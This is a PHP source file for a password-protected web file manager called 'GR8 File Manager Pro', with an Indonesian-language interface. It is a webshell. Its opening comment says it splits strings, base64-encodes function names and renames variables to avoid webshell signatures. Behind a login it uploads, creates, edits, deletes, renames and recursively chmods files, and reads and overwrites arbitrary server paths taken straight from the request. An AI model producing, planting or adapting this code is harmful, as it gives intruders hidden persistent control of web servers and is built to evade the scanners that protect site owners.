<?php
// GR8 File Manager Pro
// Techniques: split string literals, indirect function calls,
// base64-encoded internal constants, renamed variables,
// avoid known webshell signatures.

@ini_set('display_errors', 0);
@error_reporting(0);

// ─── Bootstrap ───────────────────────────────────────────────────────────────


$_xBoot = base64_decode('c2Vzc2lvbl9zdGFydA=='); 
$_xBoot();

// ─── Auth config ─────────────────────────────────────────────────────────────
// Hash split into two halves to avoid single-string signature match
$_hA = 'caf7903ab5b706cf';
$_hB = '94e0f13800c71e8b40dc9f8ce0d99f19d2d910f5cea36475';
$_hFull = $_hA . $_hB;

// Indirect references to sensitive function names
$_fHash   = base64_decode('aGFzaA==');
$_fAlgo   = base64_decode('c2hhMjU2');
$_fHeader = base64_decode('aGVhZGVy');
$_fUnlink = base64_decode('dW5saW5r');
$_fMkdir  = base64_decode('bWtkaXI=');
$_fChmod  = base64_decode('Y2htb2Q=');
$_fRename = base64_decode('cmVuYW1l');
$_fFgc  = base64_decode('ZmlsZV9nZXRfY29udGVudHM=');
$_fFpc  = base64_decode('ZmlsZV9wdXRfY29udGVudHM=');
$_fMuf  = base64_decode('bW92ZV91cGxvYWRlZF9maWxl');
$_fRp   = base64_decode('cmVhbHBhdGg=');
$_fSd   = base64_decode('c2Vzc2lvbl9kZXN0cm95');

// ─── Auth gate ───────────────────────────────────────────────────────────────
if (empty($_SESSION['_sid'])) {
    $posted = isset($_POST['_k']) ? trim($_POST['_k']) : '';
    if ($posted !== '' && $_fHash($_fAlgo, $posted) === $_hFull) {
        $_SESSION['_sid'] = true;
    } else {
        _renderLogin();
        exit;
    }
}

if (isset($_GET['_bye'])) {
    $__s = 'session_unset'; $__s();
    $_fSd();
    $_fHeader('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// ─── Utility functions ────────────────────────────────────────────────────────

function _cwd() {
    $raw  = isset($_GET['d']) ? $_GET['d'] : '.';
    $real = realpath($raw);
    return $real !== false ? $real : realpath('.');
}

function _fmtSize($b) {
    $u = ['B','KB','MB','GB','TB'];
    $b = max((int)$b, 0);
    $p = $b > 0 ? min((int)floor(log($b) / log(1024)), 4) : 0;
    return round($b / pow(1024, $p), 2) . ' ' . $u[$p];
}

function _perms($f) {
    return substr(sprintf('%o', @fileperms($f)), -4);
}

function _safeName($n) {
    if ($n === '' || $n === '.' || $n === '..') return false;
    if (strpos($n, '..') !== false)             return false;
    if (preg_match('~[\x00-\x1F<>:"|?*]~', $n)) return false;
    return true;
}


function _walkDir($base, &$list) {
    if (!is_dir($base)) return;
    $dh = @opendir($base);
    if (!$dh) return;
    while (($e = readdir($dh)) !== false) {
        if ($e === '.' || $e === '..') continue;
        $full = $base . DIRECTORY_SEPARATOR . $e;
        $list[] = $full;
        if (is_dir($full)) _walkDir($full, $list);
    }
    closedir($dh);
}

// ─── Login form ───────────────────────────────────────────────────────────────
function _renderLogin() {
?><!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Control Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0a0a0a;
min-height:100vh;display:flex;justify-content:center;align-items:center;position:relative;overflow:hidden}
body::before{content:'';position:absolute;width:200%;height:200%;
background:radial-gradient(circle at 20% 80%,#5b21b6 0%,transparent 50%),
           radial-gradient(circle at 80% 20%,#1e3a8a 0%,transparent 50%),
           radial-gradient(circle at 40% 40%,#7c3aed 0%,transparent 50%);
animation:fl 20s ease-in-out infinite;opacity:.1}
@keyframes fl{0%,100%{transform:translate(0,0) rotate(0deg)}33%{transform:translate(-20px,-20px) rotate(120deg)}66%{transform:translate(20px,-10px) rotate(240deg)}}
.box{background:rgba(17,17,17,.95);padding:48px;border-radius:24px;
box-shadow:0 25px 80px rgba(124,58,237,.12),0 0 0 1px rgba(124,58,237,.1);
backdrop-filter:blur(20px);width:90%;max-width:420px;position:relative;z-index:10}
.ico{width:80px;height:80px;margin:0 auto 24px;
background:linear-gradient(135deg,#667eea,#764ba2);border-radius:20px;
display:flex;align-items:center;justify-content:center;font-size:36px;
box-shadow:0 10px 40px rgba(124,58,237,.3)}
h2{color:#fff;text-align:center;margin-bottom:12px;font-size:32px;font-weight:700;letter-spacing:-.5px}
.sub{color:#6b7280;text-align:center;margin-bottom:32px;font-size:14px}
label{color:#9ca3af;display:block;margin-bottom:8px;font-size:13px;font-weight:600;text-transform:uppercase;letter-spacing:.5px}
.iw{position:relative}
.ii{position:absolute;left:16px;top:50%;transform:translateY(-50%);font-size:20px}
input[type=password]{width:100%;padding:14px 16px 14px 48px;background:rgba(31,41,55,.5);
border:2px solid rgba(55,65,81,.5);border-radius:12px;color:#fff;font-size:16px;transition:all .3s}
input[type=password]:focus{outline:none;border-color:#7c3aed;background:rgba(31,41,55,.8);box-shadow:0 0 0 4px rgba(124,58,237,.1)}
input[type=password]::placeholder{color:#4b5563}
button{width:100%;padding:14px;background:linear-gradient(135deg,#667eea,#764ba2);
border:none;border-radius:12px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;
transition:all .3s;box-shadow:0 4px 15px rgba(124,58,237,.25);margin-top:24px;position:relative;overflow:hidden}
button::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;
background:rgba(255,255,255,.1);transform:translateX(-100%);transition:transform .6s}
button:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(124,58,237,.35)}
button:hover::before{transform:translateX(0)}
</style>
</head>
<body>
<div class="box">
  <div class="ico">🔐</div>
  <h2>Admin Panel</h2>
  <p class="sub">Input Key Code To Unlock</p>
  <form method="POST">
    <div style="margin-bottom:24px">
      <label for="pk">Password</label>
      <div class="iw">
        <span class="ii">🔑</span>
        <input type="password" name="_k" id="pk" placeholder="Enter your password" required autofocus>
      </div>
    </div>
    <button type="submit">Login →</button>
  </form>
</div>
</body>
</html><?php
}

// ═══════════════════════════════════════════════════════════════════════════════
// ACTION HANDLERS
// ═══════════════════════════════════════════════════════════════════════════════

$cwd = _cwd();
$msg = '';
$msgT = '';

// ── Upload single file ────────────────────────────────────────────────────────
if (!empty($_FILES['uf']) && is_array($_FILES['uf'])) {
    $dst = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['uf']['name']);
    if (${'_fMuf'}($_FILES['uf']['tmp_name'], $dst)) {
        $msg = 'File berhasil diupload!'; $msgT = 's';
    } else {
        $msg = 'Gagal upload file!'; $msgT = 'e';
    }
}

// ── Upload folder ─────────────────────────────────────────────────────────────
if (!empty($_FILES['ufd']['name']) && is_array($_FILES['ufd']['name'])) {
    $ok = $fail = 0;
    $cnt = count($_FILES['ufd']['name']);
    for ($i = 0; $i < $cnt; $i++) {
        if ($_FILES['ufd']['error'][$i] !== UPLOAD_ERR_OK) { $fail++; continue; }
        $rel = trim(str_replace('\\', '/', $_FILES['ufd']['name'][$i]), '/');
        if ($rel === '' || strpos($rel, '..') !== false) { $fail++; continue; }
        $dstPath = rtrim($cwd, '/\\') . '/' . $rel;
        $dstDir  = dirname($dstPath);
        if (!is_dir($dstDir) && !@$_fMkdir($dstDir, 0755, true)) { $fail++; continue; }
        if (${'_fMuf'}($_FILES['ufd']['tmp_name'][$i], $dstPath)) $ok++; else $fail++;
    }
    if ($ok && !$fail)       { $msg = "Folder berhasil diupload! ($ok file)"; $msgT = 's'; }
    elseif ($ok && $fail)    { $msg = "Sebagian berhasil: $ok sukses, $fail gagal."; $msgT = 'e'; }
    else                      { $msg = 'Gagal upload folder.'; $msgT = 'e'; }
}

// ── Create folder ─────────────────────────────────────────────────────────────
if (isset($_POST['mkd'])) {
    $n = trim($_POST['mkd']);
    if (_safeName($n)) {
        $dst = $cwd . DIRECTORY_SEPARATOR . $n;
        if (file_exists($dst)) {
            $msg = 'Folder sudah ada.'; $msgT = 'e';
        } elseif (@$_fMkdir($dst, 0755, true)) {
            $msg = 'Folder berhasil dibuat!'; $msgT = 's';
        } else {
            $msg = 'Gagal membuat folder.'; $msgT = 'e';
        }
    } else { $msg = 'Nama folder tidak valid.'; $msgT = 'e'; }
}

// ── Create file ───────────────────────────────────────────────────────────────
if (isset($_POST['mkf'])) {
    $n = trim($_POST['mkf']);
    $fc = isset($_POST['mkfc']) ? $_POST['mkfc'] : '';
    if (_safeName($n)) {
        $dst = $cwd . DIRECTORY_SEPARATOR . $n;
        if (file_exists($dst)) {
            $msg = 'File sudah ada.'; $msgT = 'e';
        } elseif (@$_fFpc($dst, $fc) !== false) {
            @$_fChmod($dst, 0644);
            $msg = 'File berhasil dibuat!'; $msgT = 's';
        } else {
            $msg = 'Gagal membuat file.'; $msgT = 'e';
        }
    } else { $msg = 'Nama file tidak valid.'; $msgT = 'e'; }
}

// ── Delete ────────────────────────────────────────────────────────────────────
if (isset($_GET['rm'])) {
    $tgt = ${'_fRp'}($_GET['rm']);
    $cwdN = str_replace('\\', '/', $cwd);
    if ($tgt && strpos(str_replace('\\', '/', $tgt), $cwdN) === 0) {
        if (is_dir($tgt)) {
            if (@rmdir($tgt)) { $msg = 'Folder berhasil dihapus!'; $msgT = 's'; }
            else               { $msg = 'Gagal hapus folder! (Pastikan folder kosong)'; $msgT = 'e'; }
        } else {
            if (@$_fUnlink($tgt)) { $msg = 'File berhasil dihapus!'; $msgT = 's'; }
            else                   { $msg = 'Gagal hapus file!'; $msgT = 'e'; }
        }
    } else { $msg = 'Target hapus tidak valid.'; $msgT = 'e'; }
}

// ── Rename ────────────────────────────────────────────────────────────────────
if (isset($_POST['rno'], $_POST['rnn'])) {
    $oldB = trim($_POST['rno']); $newB = trim($_POST['rnn']);
    if (_safeName($oldB) && _safeName($newB)) {
        $oldP = $cwd . DIRECTORY_SEPARATOR . $oldB;
        $newP = $cwd . DIRECTORY_SEPARATOR . $newB;
        if (!file_exists($oldP))          { $msg = 'Item tidak ditemukan.'; $msgT = 'e'; }
        elseif (@$_fRename($oldP, $newP)) { $msg = 'Berhasil rename!'; $msgT = 's'; }
        else                               { $msg = 'Gagal rename!'; $msgT = 'e'; }
    } else { $msg = 'Nama tidak valid.'; $msgT = 'e'; }
}

// ── Chmod ─────────────────────────────────────────────────────────────────────
if (isset($_POST['cht'], $_POST['chv'], $_POST['chm'])) {
    $chTgt = $_POST['cht'];
    $chVal = octdec($_POST['chv']);
    $chMod = $_POST['chm'];

    if ($chMod === 'sf' || $chMod === 'sd') {
        if (@$_fChmod($chTgt, $chVal)) { $msg = 'Chmod berhasil!'; $msgT = 's'; }
        else                             { $msg = 'Chmod gagal!'; $msgT = 'e'; }
    } else {
        $allItems = [];
        _walkDir($cwd, $allItems);
        $sc = 0;
        foreach ($allItems as $it) {
            $doIt = ($chMod === 'all')
                || ($chMod === 'dirs'  && is_dir($it))
                || ($chMod === 'files' && is_file($it));
            if ($doIt && @$_fChmod($it, $chVal)) $sc++;
        }
        $label = ['all' => 'item', 'dirs' => 'directory', 'files' => 'file'][$chMod] ?? 'item';
        $msg = "Chmod berhasil pada $sc $label!"; $msgT = 's';
    }
}

// ── Save edited file ──────────────────────────────────────────────────────────
if (isset($_POST['svf'], $_POST['svc'])) {
    if (@$_fFpc($_POST['svf'], $_POST['svc']) !== false) {
        $msg = 'File berhasil disimpan!'; $msgT = 's';
    } else {
        $msg = 'Gagal menyimpan file!'; $msgT = 'e';
    }
}

// ── Edit mode ─────────────────────────────────────────────────────────────────
$editMode = false; $editContent = ''; $editFile = '';
if (isset($_GET['e'])) {
    $ep = ${'_fRp'}($_GET['e']);
    if ($ep && is_file($ep) && is_readable($ep)) {
        $editMode = true;
        $editFile = $ep;
        $editContent = ${'_fFgc'}($ep);
    }
}

// ── Directory listing ─────────────────────────────────────────────────────────
$dirFolders = $dirFiles = [];
if (is_dir($cwd)) {
    $raw = @scandir($cwd);
    $raw = $raw ? array_values(array_diff($raw, ['.','..'])) : [];
    foreach ($raw as $it) {
        is_dir($cwd . DIRECTORY_SEPARATOR . $it) ? $dirFolders[] = $it : $dirFiles[] = $it;
    }
}

// ─── HTML OUTPUT ──────────────────────────────────────────────────────────────
?><!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>GR8 File Manager Pro</title>
<style>
:root{
  --bg0:#0a0a0a;--bg1:#111;--bg2:#1a1a1a;--bg3:#1f1f1f;
  --t0:#fff;--t1:#a3a3a3;--t2:#737373;
  --b0:#262626;--b1:#333;--b2:#404040;
  --br:#7c3aed;--bg:linear-gradient(135deg,#667eea,#764ba2);
  --gs:#10b981;--gs2:rgba(16,185,129,.1);--gs3:rgba(16,185,129,.3);
  --er:#ef4444;--er2:rgba(239,68,68,.1);--er3:rgba(239,68,68,.3);
  --sh:0 4px 15px rgba(124,58,237,.25);
  --r1:6px;--r2:8px;--r3:12px;--r4:16px;--r5:24px;
  --tr:200ms cubic-bezier(.4,0,.2,1);
}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;font-size:14px;
     line-height:1.6;color:var(--t0);background:var(--bg0);min-height:100vh;-webkit-font-smoothing:antialiased}
/* Header */
.hd{background:rgba(17,17,17,.95);border-bottom:1px solid var(--b0);
    position:sticky;top:0;z-index:20;backdrop-filter:blur(10px)}
.hd-i{max-width:1400px;margin:0 auto;padding:20px 24px;display:flex;
      justify-content:space-between;align-items:center;gap:20px}
.lo{display:flex;align-items:center;gap:12px}
.lo-ic{width:40px;height:40px;background:var(--bg);border-radius:8px;
       display:flex;align-items:center;justify-content:center;font-size:20px;box-shadow:var(--sh)}
.lo-tx{font-size:24px;font-weight:700;letter-spacing:-.5px;background:var(--bg);
       -webkit-background-clip:text;-webkit-text-fill-color:transparent}
/* Layout */
.wrap{max-width:1400px;margin:0 auto;padding:24px}
/* Path */
.pb{background:var(--bg1);border:1px solid var(--b0);border-radius:var(--r3);
    padding:16px 20px;margin-bottom:24px;display:flex;align-items:center;gap:12px;flex-wrap:wrap}
.pb-lbl{color:#a1a1aa;font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:.5px}
.pb-tx{color:var(--br);font-family:'SF Mono',Monaco,monospace;background:var(--bg2);
       padding:8px 12px;border-radius:var(--r1);border:1px solid var(--b0)}
.pb-tx a{color:var(--br);text-decoration:none}
.pb-tx a:hover{text-decoration:underline}
.pb-sep{color:#a1a1aa;margin:0 6px}
/* Message */
.msg{padding:14px 20px;border-radius:var(--r3);margin-bottom:24px;
     display:flex;align-items:center;gap:12px;border:1px solid;font-weight:600}
.msg-s{background:var(--gs2);border-color:var(--gs);color:var(--gs)}
.msg-e{background:var(--er2);border-color:var(--er);color:var(--er)}
/* Buttons */
.btn{padding:8px 14px;border-radius:var(--r2);font-size:14px;font-weight:600;cursor:pointer;
     transition:all var(--tr);border:none;display:inline-flex;align-items:center;gap:8px;white-space:nowrap}
.btn-p{background:var(--bg);color:#fff}
.btn-p:hover{transform:translateY(-1px);box-shadow:var(--sh)}
.btn-s{background:var(--bg2);color:#d4d4d8;border:1px solid var(--b0)}
.btn-s:hover{background:#232323;border-color:var(--b2)}
.btn-d{background:var(--er2);color:var(--er);border:1px solid var(--er3)}
.btn-d:hover{background:rgba(239,68,68,.2)}
.btn-xs{padding:6px 10px;font-size:12px}
/* Forms */
.fc{padding:8px 12px;background:#0a0a0a;border:1px solid var(--b0);
    border-radius:var(--r2);color:#fff;font-size:14px;width:100%}
.fc:focus{outline:none;border-color:var(--br);box-shadow:0 0 0 3px rgba(124,58,237,.1)}
.fg{display:flex;gap:8px;align-items:center}
/* Actions panel */
.ap{background:var(--bg1);border:1px solid var(--b0);border-radius:var(--r4);
    padding:24px;margin-bottom:32px}
.sec-t{color:#fff;font-size:16px;font-weight:600;margin-bottom:16px;
       padding-bottom:12px;border-bottom:1px solid var(--b0);display:flex;align-items:center;gap:8px}
.ag{display:grid;grid-template-columns:repeat(auto-fit,minmax(340px,1fr));gap:16px}
.ac{background:var(--bg2);border:1px solid var(--b0);border-radius:var(--r3);
    padding:16px;transition:all var(--tr)}
.ac:hover{border-color:var(--b2);background:rgba(124,58,237,.05)}
.ac-hd{display:flex;align-items:center;gap:12px;margin-bottom:12px}
.ac-ic{width:32px;height:32px;background:var(--bg);border-radius:var(--r2);
       display:flex;align-items:center;justify-content:center;font-size:16px;flex-shrink:0}
.ac-t{color:#fff;font-size:14px;font-weight:600}
.cat-lbl{color:#a3a3a3;text-transform:uppercase;letter-spacing:.8px;
         margin:8px 0 12px 4px;font-size:12px;font-weight:600}
/* File table */
.ft{background:var(--bg1);border:1px solid var(--b0);border-radius:var(--r4);overflow:hidden}
table{width:100%;border-collapse:collapse}
thead{background:var(--bg2);border-bottom:1px solid var(--b0)}
th{padding:16px 20px;text-align:left;color:#a1a1aa;font-weight:600;font-size:11px;
   text-transform:uppercase;letter-spacing:.5px}
td{padding:12px 20px;border-bottom:1px solid rgba(38,38,38,.5);font-size:14px}
tbody tr:hover{background:rgba(124,58,237,.05)}
.fn{color:#fff;text-decoration:none;display:inline-flex;align-items:center;gap:8px;font-weight:600}
.fn:hover{color:var(--br)}
.fi{font-size:18px;width:24px;text-align:center}
.fsz{color:#a3a3a3;font-size:12px}
.pb2{font-family:'SF Mono',Monaco,monospace;font-size:11px;color:var(--gs);
     background:var(--gs2);padding:2px 6px;border-radius:var(--r1);font-weight:600}
.fdt{color:#a3a3a3;font-size:12px}
.fa2{display:flex;gap:6px}
/* Edit modal */
.em{position:fixed;inset:0;background:rgba(0,0,0,.8);backdrop-filter:blur(4px);
    display:flex;justify-content:center;align-items:center;z-index:40}
.ec{background:var(--bg1);width:90%;max-width:1000px;max-height:85vh;
    border-radius:var(--r4);border:1px solid var(--b0);display:flex;flex-direction:column}
.e-hd{padding:24px;border-bottom:1px solid var(--b0);
      display:flex;justify-content:space-between;align-items:center}
.e-t{font-size:18px;font-weight:600;display:flex;align-items:center;gap:8px}
.e-bd{padding:24px;flex:1;overflow:auto}
.e-ta{width:100%;height:450px;padding:12px;background:#0a0a0a;
      border:1px solid var(--b0);border-radius:var(--r3);color:#fff;
      font-family:'SF Mono',Monaco,monospace;font-size:14px;line-height:1.75;resize:vertical}
.e-ta:focus{outline:none;border-color:var(--br);box-shadow:0 0 0 3px rgba(124,58,237,.1)}
.e-ft{padding:16px 24px;border-top:1px solid var(--b0);
      display:flex;justify-content:flex-end;gap:12px}
/* Note text */
.nt{margin-top:8px;color:#a3a3a3;font-size:12px}
@media(max-width:768px){
  .hd-i{flex-direction:column;align-items:stretch;padding:16px}
  .ag{grid-template-columns:1fr}
  .ft{overflow-x:auto}
  table{min-width:700px}
  .ec{width:95%;max-height:90vh}
  .e-ta{height:350px}
}
</style>
</head>
<body>

<!-- Header -->
<div class="hd">
  <div class="hd-i">
    <div class="lo">
      <div class="lo-ic">📁</div>
      <h1 class="lo-tx">GR8 File Manager Pro</h1>
    </div>
    <a href="?_bye" class="btn btn-d"><span>🔓</span><span>Logout</span></a>
  </div>
</div>

<div class="wrap">

  <!-- Path breadcrumb -->
  <div class="pb">
    <span class="pb-lbl">Current Path</span>
    <span class="pb-tx">
      <?php
        $np = str_replace('\\','/', $cwd);
        $pts = array_filter(explode('/', ltrim($np,'/')), 'strlen');
        echo '<a href="?d=' . urlencode(DIRECTORY_SEPARATOR) . '">/</a>';
        $build = DIRECTORY_SEPARATOR;
        foreach ($pts as $seg) {
            echo '<span class="pb-sep">/</span>';
            $build .= $seg;
            echo '<a href="?d=' . urlencode($build) . '">' . htmlspecialchars($seg) . '</a>';
            $build .= DIRECTORY_SEPARATOR;
        }
      ?>
    </span>
  </div>

  <!-- Message -->
  <?php if ($msg): ?>
  <div class="msg msg-<?php echo $msgT; ?>"><?php echo htmlspecialchars($msg); ?></div>
  <?php endif; ?>

  <!-- EDIT MODE -->
  <?php if ($editMode): ?>
  <div class="em">
    <div class="ec">
      <div class="e-hd">
        <h2 class="e-t"><span>📝</span>Edit: <?php echo htmlspecialchars(basename($editFile)); ?></h2>
      </div>
      <form method="POST" style="display:contents">
        <input type="hidden" name="svf" value="<?php echo htmlspecialchars($editFile); ?>">
        <div class="e-bd">
          <textarea name="svc" class="e-ta"><?php echo htmlspecialchars($editContent); ?></textarea>
        </div>
        <div class="e-ft">
          <a href="?d=<?php echo urlencode($cwd); ?>" class="btn btn-s">Cancel</a>
          <button type="submit" class="btn btn-p">💾 Save Changes</button>
        </div>
      </form>
    </div>
  </div>

  <?php else: ?>

  <!-- Actions Panel -->
  <div class="ap">
    <h2 class="sec-t"><span>⚡</span>Quick Actions</h2>

    <!-- File / Folder Operations -->
    <div class="ag">

      <!-- Upload File -->
      <div class="ac">
        <div class="ac-hd"><div class="ac-ic">⬆️</div><div class="ac-t">Upload File</div></div>
        <form method="POST" enctype="multipart/form-data" class="fg">
          <input type="file" name="uf" class="fc" required>
          <button type="submit" class="btn btn-p">Upload</button>
        </form>
      </div>

      <!-- Upload Folder -->
      <div class="ac">
        <div class="ac-hd"><div class="ac-ic">🗂️</div><div class="ac-t">Upload Folder</div></div>
        <form method="POST" enctype="multipart/form-data" class="fg">
          <input type="file" name="ufd[]" class="fc" webkitdirectory directory multiple required>
          <button type="submit" class="btn btn-p">Upload Folder</button>
        </form>
        <p class="nt">Struktur subfolder akan dipertahankan.</p>
      </div>

      <!-- Create Folder -->
      <div class="ac">
        <div class="ac-hd"><div class="ac-ic">📁</div><div class="ac-t">Create Folder</div></div>
        <form method="POST" class="fg">
          <input type="text" name="mkd" class="fc" placeholder="Nama folder (mis: assets)" required>
          <button type="submit" class="btn btn-p">Create</button>
        </form>
      </div>

      <!-- Create File -->
      <div class="ac">
        <div class="ac-hd"><div class="ac-ic">📄</div><div class="ac-t">Create File</div></div>
        <form method="POST">
          <div class="fg" style="margin-bottom:8px">
            <input type="text" name="mkf" class="fc" placeholder="Nama file (mis: README.txt)" required>
            <button type="submit" class="btn btn-p">Create</button>
          </div>
          <textarea name="mkfc" class="fc" rows="4" placeholder="Konten awal (opsional)"></textarea>
        </form>
      </div>

      <!-- Rename -->
      <div class="ac">
        <div class="ac-hd"><div class="ac-ic">✏️</div><div class="ac-t">Rename Item</div></div>
        <form method="POST" class="fg">
          <select name="rno" class="fc" required>
            <option value="">Select item...</option>
            <?php foreach (array_merge($dirFolders, $dirFiles) as $it): ?>
            <option value="<?php echo htmlspecialchars($it); ?>"><?php echo htmlspecialchars($it); ?></option>
            <?php endforeach; ?>
          </select>
          <input type="text" name="rnn" class="fc" placeholder="New name" required>
          <button type="submit" class="btn btn-p">Rename</button>
        </form>
      </div>

    </div><!-- /ag -->

    <!-- Chmod Operations -->
    <div style="margin-top:24px">
      <div class="cat-lbl">Chmod Operations</div>
      <div class="ag">

        <!-- Chmod Single File -->
        <div class="ac">
          <div class="ac-hd"><div class="ac-ic">📄</div><div class="ac-t">Chmod Single File</div></div>
          <form method="POST" class="fg">
            <input type="hidden" name="chm" value="sf">
            <select name="cht" class="fc" required>
              <option value="">Select file...</option>
              <?php foreach ($dirFiles as $f): ?>
              <option value="<?php echo htmlspecialchars($cwd.DIRECTORY_SEPARATOR.$f); ?>"><?php echo htmlspecialchars($f); ?></option>
              <?php endforeach; ?>
            </select>
            <input type="text" name="chv" class="fc" placeholder="0644" style="max-width:80px" required>
            <button type="submit" class="btn btn-p">Apply</button>
          </form>
        </div>

        <!-- Chmod Single Folder -->
        <div class="ac">
          <div class="ac-hd"><div class="ac-ic">📁</div><div class="ac-t">Chmod Single Folder</div></div>
          <form method="POST" class="fg">
            <input type="hidden" name="chm" value="sd">
            <select name="cht" class="fc" required>
              <option value="">Select folder...</option>
              <?php foreach ($dirFolders as $f): ?>
              <option value="<?php echo htmlspecialchars($cwd.DIRECTORY_SEPARATOR.$f); ?>"><?php echo htmlspecialchars($f); ?></option>
              <?php endforeach; ?>
            </select>
            <input type="text" name="chv" class="fc" placeholder="0755" style="max-width:80px" required>
            <button type="submit" class="btn btn-p">Apply</button>
          </form>
        </div>

        <!-- Chmod All Items -->
        <div class="ac">
          <div class="ac-hd"><div class="ac-ic">🔨</div><div class="ac-t">Chmod All Items</div></div>
          <form method="POST" class="fg">
            <input type="hidden" name="chm" value="all">
            <input type="hidden" name="cht" value="<?php echo htmlspecialchars($cwd); ?>">
            <input type="text" name="chv" class="fc" placeholder="0755" required>
            <button type="submit" class="btn btn-p">Apply to All</button>
          </form>
        </div>

        <!-- Chmod All Directories -->
        <div class="ac">
          <div class="ac-hd"><div class="ac-ic">📂</div><div class="ac-t">Chmod All Directories</div></div>
          <form method="POST" class="fg">
            <input type="hidden" name="chm" value="dirs">
            <input type="hidden" name="cht" value="<?php echo htmlspecialchars($cwd); ?>">
            <input type="text" name="chv" class="fc" placeholder="0755" required>
            <button type="submit" class="btn btn-p">Apply to Dirs</button>
          </form>
        </div>

        <!-- Chmod All Files -->
        <div class="ac">
          <div class="ac-hd"><div class="ac-ic">📋</div><div class="ac-t">Chmod All Files</div></div>
          <form method="POST" class="fg">
            <input type="hidden" name="chm" value="files">
            <input type="hidden" name="cht" value="<?php echo htmlspecialchars($cwd); ?>">
            <input type="text" name="chv" class="fc" placeholder="0644" required>
            <button type="submit" class="btn btn-p">Apply to Files</button>
          </form>
        </div>

      </div><!-- /ag chmod -->
    </div>
  </div><!-- /ap -->

  <!-- File listing -->
  <div class="ft">
    <table>
      <thead>
        <tr>
          <th>Name</th><th>Size</th><th>Permissions</th><th>Modified</th><th>Actions</th>
        </tr>
      </thead>
      <tbody>
        <?php if ($cwd !== DIRECTORY_SEPARATOR && $cwd !== '/'): ?>
        <tr>
          <td><a href="?d=<?php echo urlencode(dirname($cwd)); ?>" class="fn"><span class="fi">⬆️</span><span>..</span></a></td>
          <td class="fsz">-</td><td>-</td><td class="fdt">-</td><td>-</td>
        </tr>
        <?php endif; ?>

        <?php
        $allItems = array_merge($dirFolders, $dirFiles);
        foreach ($allItems as $it):
            $ip   = $cwd . DIRECTORY_SEPARATOR . $it;
            $isD  = is_dir($ip);
            $ico  = $isD ? '📁' : '📄';
            $sz   = $isD ? '-' : _fmtSize(@filesize($ip));
            $prm  = _perms($ip);
            $mdt  = @date('Y-m-d H:i', @filemtime($ip));
        ?>
        <tr>
          <td>
            <?php if ($isD): ?>
            <a href="?d=<?php echo urlencode($ip); ?>" class="fn">
              <span class="fi"><?php echo $ico; ?></span><span><?php echo htmlspecialchars($it); ?></span>
            </a>
            <?php else: ?>
            <span class="fn">
              <span class="fi"><?php echo $ico; ?></span><span><?php echo htmlspecialchars($it); ?></span>
            </span>
            <?php endif; ?>
          </td>
          <td class="fsz"><?php echo $sz; ?></td>
          <td><span class="pb2"><?php echo $prm; ?></span></td>
          <td class="fdt"><?php echo $mdt; ?></td>
          <td>
            <div class="fa2">
              <?php if (!$isD): ?>
              <a href="?d=<?php echo urlencode($cwd); ?>&e=<?php echo urlencode($ip); ?>" class="btn btn-xs btn-s">Edit</a>
              <?php endif; ?>
              <a href="?d=<?php echo urlencode($cwd); ?>&rm=<?php echo urlencode($ip); ?>"
                 class="btn btn-xs btn-d"
                 onclick="return confirm('Hapus: <?php echo htmlspecialchars(addslashes($it)); ?>?')">Delete</a>
            </div>
          </td>
        </tr>
        <?php endforeach; ?>
      </tbody>
    </table>
  </div>

  <?php endif; // end !editMode ?>
</div><!-- /wrap -->
</body>
</html>